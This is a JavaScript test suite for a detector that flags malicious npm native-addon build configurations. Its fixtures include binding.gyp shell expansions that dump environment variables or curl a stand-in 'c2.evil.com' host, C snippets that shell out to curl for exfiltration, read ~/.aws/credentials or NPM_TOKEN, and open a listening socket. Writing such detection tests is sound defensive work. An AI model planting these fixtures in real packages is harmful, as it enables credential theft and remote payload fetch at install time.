import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-build-config-abuse.js';

const maliciousGypShellExec = JSON.stringify({
  targets: [
    {
      target_name: 'addon',
      dependencies: ['<!(node -e "console.log(process.env)")'],
      sources: ['src/addon.cc'],
    },
  ],
});

const maliciousCppCreds = `#include <string>
#include <curl/curl.h>
int main() {
  const char* TOKEN = "abcdefghijklmnopqrstuvwxyz123456";
  curl_easy_perform(curl_easy_init());
  const char* home = getenv("HOME");
  socket(AF_INET, SOCK_STREAM, 0);
  return 0;
}`;

const cleanCppCode = `#include <napi.h>
Napi::String Method(const Napi::CallbackInfo& info) {
  Napi::Env env = info.Env();
  return Napi::String::New(env, "hello");
}
NODE_API_MODULE(addon, Method)`;

const cleanBindingGyp = JSON.stringify({
  targets: [{ target_name: 'addon', sources: ['src/addon.cc'] }],
});

test('D14: shell exec in binding.gyp detected', async () => {
  const files = [
    { path: 'binding.gyp', content: maliciousGypShellExec },
    { path: 'src/addon.cc', content: cleanCppCode },
  ];
  const pkgJson = { name: 'suspicious-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'shell_exec'),
    'expected shell_exec pattern in detail'
  );
  assert.ok(
    findings[0].confidenceScore >= 70,
    `expected confidenceScore >= 70, got ${findings[0].confidenceScore}`
  );
  assert.equal(findings[0].detector, 'tier1-build-config-abuse');
});

test('D14: hardcoded credentials in C code detected', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/addon.cc', content: maliciousCppCreds },
  ];
  const pkgJson = { name: 'malicious-addon', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'hardcoded_key'),
    'expected hardcoded_key pattern in detail'
  );
});

test('D14: network calls in native addon detected', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    {
      path: 'src/addon.cc',
      content:
        '#include <curl/curl.h>\nint main() { curl_easy_perform(curl_easy_init()); return 0; }',
    },
  ];
  const pkgJson = { name: 'network-addon', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'curl_call'),
    'expected curl_call pattern in detail'
  );
});

test('D14: legitimate sqlite3 produces low/medium findings only (no high/critical)', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/sqlite3.cc', content: cleanCppCode },
  ];
  const pkgJson = { name: 'sqlite3', version: '5.1.0' };
  const findings = await scan(pkgJson, [], null, files);
  const highCrit = findings.filter((f) => f.severity === 'high' || f.severity === 'critical');
  assert.equal(highCrit.length, 0, 'sqlite3 should not produce high/critical findings');
});

test('D14: legitimate bcrypt produces no high/critical findings', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/bcrypt.cc', content: cleanCppCode },
  ];
  const pkgJson = { name: 'bcrypt', version: '5.0.1' };
  const findings = await scan(pkgJson, [], null, files);
  const highCrit = findings.filter((f) => f.severity === 'high' || f.severity === 'critical');
  assert.equal(highCrit.length, 0, 'bcrypt should not produce high/critical findings');
});

test('D14: undeclared binding.gyp flagged', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/addon.cc', content: cleanCppCode },
  ];
  const pkgJson = { name: 'stealth-addon', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].evidence?.some((e) => e.includes('binding.gyp')),
    'expected evidence mentioning binding.gyp'
  );
});

test('D14: declared binding.gyp via gypfile flag not flagged as undeclared', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/addon.cc', content: cleanCppCode },
  ];
  const pkgJson = { name: 'honest-addon', version: '1.0.0', gypfile: true };
  const findings = await scan(pkgJson, [], null, files);
  assert.equal(findings.length, 0, 'declared gypfile should not produce findings');
});

test('D14: declared binding.gyp via install script not flagged as undeclared', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/addon.cc', content: cleanCppCode },
  ];
  const pkgJson = {
    name: 'honest-addon',
    version: '1.0.0',
    scripts: { install: 'node-gyp rebuild' },
  };
  const findings = await scan(pkgJson, [], null, files);
  assert.equal(findings.length, 0, 'declared via install script should not produce findings');
});

test('D14: large prebuilt .node file flagged', async () => {
  const largeContent = Buffer.alloc(12 * 1024 * 1024).toString('binary');
  const files = [{ path: 'build/Release/addon.node', content: largeContent }];
  const pkgJson = { name: 'large-binary-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].evidence?.some((e) => e.includes('prebuilt')),
    'expected evidence mentioning prebuilt binary'
  );
});

test('D14: empty package returns no findings', async () => {
  const findings = await scan({}, [], null, []);
  assert.equal(findings.length, 0);
});

test('D14: no binding.gyp returns no findings', async () => {
  const files = [{ path: 'index.js', content: 'console.log("hello")' }];
  const pkgJson = { name: 'simple-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert.equal(findings.length, 0);
});

test('D14: known reputable package suppresses tier1 findings', async () => {
  const files = [
    { path: 'binding.gyp', content: maliciousGypShellExec },
    { path: 'src/addon.cc', content: maliciousCppCreds },
  ];
  const pkgJson = { name: 'electron', version: '28.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert.equal(findings.length, 0, 'electron should suppress D14 findings');
});

test('D14: known reputable package (sharp) suppresses findings', async () => {
  const files = [
    { path: 'binding.gyp', content: maliciousGypShellExec },
    { path: 'src/addon.cc', content: maliciousCppCreds },
  ];
  const pkgJson = { name: 'sharp', version: '0.33.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert.equal(findings.length, 0, 'sharp should suppress D14 findings');
});

test('D14: legitimate native addon (node-sass) produces no findings when declared', async () => {
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/sass.cc', content: cleanCppCode },
  ];
  const pkgJson = { name: 'node-sass', version: '9.0.0', gypfile: true };
  const findings = await scan(pkgJson, [], null, files);
  assert.equal(findings.length, 0, 'node-sass with declared gyp should produce no findings');
});

test('D14: env_access pattern in binding.gyp detected', async () => {
  const gypWithEnv = JSON.stringify({
    targets: [
      {
        target_name: 'addon',
        dependencies: ['<!(node -e "console.log(process.env.HOME)")'],
      },
    ],
  });
  const files = [{ path: 'binding.gyp', content: gypWithEnv }];
  const pkgJson = { name: 'env-leak-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'env_access'),
    'expected env_access pattern in detail'
  );
});

test('D14: path traversal in binding.gyp detected', async () => {
  const gypWithTraversal = JSON.stringify({
    targets: [
      {
        target_name: 'addon',
        dependencies: ['../../outside-dir/lib'],
        sources: ['src/../outside/foo.cc'],
      },
    ],
  });
  const files = [{ path: 'binding.gyp', content: gypWithTraversal }];
  const pkgJson = { name: 'traversal-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'path_traversal'),
    'expected path_traversal pattern in detail'
  );
});

test('D14: execve_call in C code detected', async () => {
  const execveCpp = `#include <unistd.h>
int main() {
  execl("/bin/sh", "sh", "-c", "curl http://c2.evil.com/exfil", NULL);
  return 0;
}`;
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/exploit.c', content: execveCpp },
  ];
  const pkgJson = { name: 'execve-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'execve_call'),
    'expected execve_call pattern in detail'
  );
});

test('D14: socket_call in C code detected', async () => {
  const socketCpp = `#include <sys/socket.h>
#include <netinet/in.h>
int main() {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  listen(sock, 5);
  accept(sock, NULL, NULL);
  return 0;
}`;
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/backdoor.c', content: socketCpp },
  ];
  const pkgJson = { name: 'socket-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'socket_call'),
    'expected socket_call pattern in detail'
  );
});

test('D14: full Phantom Gyp campaign detection produces critical severity', async () => {
  const files = [
    {
      path: 'binding.gyp',
      content: maliciousGypShellExec,
    },
    {
      path: 'src/addon.cc',
      content: maliciousCppCreds,
    },
  ];
  const pkgJson = { name: '@vapi-ai', version: '1.0.5' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert(
    ['high', 'critical'].includes(findings[0].severity),
    `expected high/critical severity, got ${findings[0].severity}`
  );
  assert.ok(
    findings[0].confidenceScore >= 70,
    `expected confidenceScore >= 70, got ${findings[0].confidenceScore}`
  );
});

test('D14: legitimate prebuilt .node (small, reasonable size) not flagged', async () => {
  const smallContent = Buffer.alloc(1 * 1024 * 1024).toString('binary');
  const files = [{ path: 'build/Release/addon.node', content: smallContent }];
  const pkgJson = { name: 'reasonable-addon', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert.equal(findings.length, 0, '1 MB .node should not produce findings');
});

test('D14: credential_scan pattern in C code detected', async () => {
  const credentialScanCpp = `#include <stdio.h>
int main() {
  FILE* f = fopen("~/.aws/credentials", "r");
  char buf[1024];
  while (fgets(buf, 1024, f)) printf("%s", buf);
  return 0;
}`;
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/stealer.cc', content: credentialScanCpp },
  ];
  const pkgJson = { name: 'cred-scanner', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'credential_scan'),
    'expected credential_scan pattern in detail'
  );
});

test('D14: unknown package with binding.gyp but no suspicious content produces findings but not high/critical', async () => {
  const files = [{ path: 'binding.gyp', content: cleanBindingGyp }];
  const pkgJson = { name: 'mystery-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings for undeclared gyp');
  assert.ok(
    findings[0].confidenceScore < 70,
    `expected confidenceScore < 70 for benign gyp, got ${findings[0].confidenceScore}`
  );
});

test('D14: getenv in C code detected', async () => {
  const getenvCpp = `#include <stdlib.h>
int main() {
  const char* token = getenv("NPM_TOKEN");
  return 0;
}`;
  const files = [
    { path: 'binding.gyp', content: cleanBindingGyp },
    { path: 'src/token.c', content: getenvCpp },
  ];
  const pkgJson = { name: 'getenv-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  assert.ok(
    findings[0].detail?.some((d) => d.type === 'getenv_call'),
    'expected getenv_call pattern in detail'
  );
});

test('D14: multiple suspicious patterns in single file aggregated correctly', async () => {
  const multiPatternGyp = JSON.stringify({
    targets: [
      {
        target_name: 'addon',
        dependencies: ['<!(curl http://c2.evil.com/payload)'],
        sources: ['../../outside/evil.cc'],
      },
    ],
  });
  const files = [{ path: 'binding.gyp', content: multiPatternGyp }];
  const pkgJson = { name: 'multi-threat', version: '1.0.0' };
  const findings = await scan(pkgJson, [], null, files);
  assert(findings.length > 0, 'expected findings');
  const types = findings[0].detail?.map((d) => d.type) || [];
  assert.ok(types.includes('shell_exec'), 'should detect shell_exec');
  assert.ok(types.includes('http_request'), 'should detect http_request');
  assert.ok(types.includes('path_traversal'), 'should detect path_traversal');
});
